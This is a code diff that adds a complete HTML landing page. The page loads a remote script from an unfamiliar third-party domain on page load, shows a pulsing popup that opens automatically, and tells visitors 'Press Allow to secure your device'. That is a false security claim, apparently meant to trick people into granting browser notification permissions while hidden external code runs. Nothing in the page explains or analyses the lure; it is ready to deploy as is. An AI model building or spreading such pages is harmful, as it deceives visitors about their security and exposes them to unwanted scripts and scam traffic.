@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script src="https://atshroomisha.com/pfe/current/tag.min.js?z=6724675" data-cfasync="false" async></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    h1 {
+      text-align: center;
+    }
+
+    .popup-container {
+      display: none;
+      position: relative; /* Change from fixed to relative positioning */
+      width: 70%;
+      margin: auto;
+      transform: translate(-50%, -50%);
+      background-color: rgba(255, 255, 255, 0.9);
+      animation: popupAnimation 2s ease-out infinite; /* Set the animation to loop infinitely */
+    }
+
+    @keyframes popupAnimation {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.1);
+      }
+    }
+
+    .popup-container img {
+      max-width: 100%;
+      height: auto;
+      margin-top: 2%;
+    }
+
+    #subheading {
+        width: 40%;
+        display: block;
+        margin: auto;
+    }
+
+    .iphone {
+        width: 50%;
+        display: block;
+        margin: auto;
+        margin-top: 3%;
+    }
+
+    h2 {
+      display: block;
+      margin: auto;
+      text-align: center;
+    }
+
+    .golden-button {
+            background-color: #FFD700; /* Golden color */
+            border: none;
+            color: #333; /* Darker text color for better visibility */
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            display: block;
+            margin: 25px 25%;
+        }
+
+        /* Style for button on hover */
+        .golden-button:hover {
+            background-color: #FFC400; /* Slightly darker golden color */
+        }
+
+  </style>
+</head>
+<body>
+
+  <div class="popup-container" id="popup">
+    <!-- Your PNG image goes here -->
+    <img src="19615.jpg" alt="Popup Image">
+  </div>
+
+  <h1>Press Allow to secure your device</h1>
+
+  <script>
+    // Function to toggle the popup
+    function togglePopup() {
+      var popup = document.getElementById("popup");
+      popup.style.display = (popup.style.display === "none" || popup.style.display === "") ? "block" : "none";
+    }
+
+    // Automatically open the popup when the page loads
+    window.onload = function() {
+      togglePopup();
+    };
+  </script>
+
+</body>
+</html>
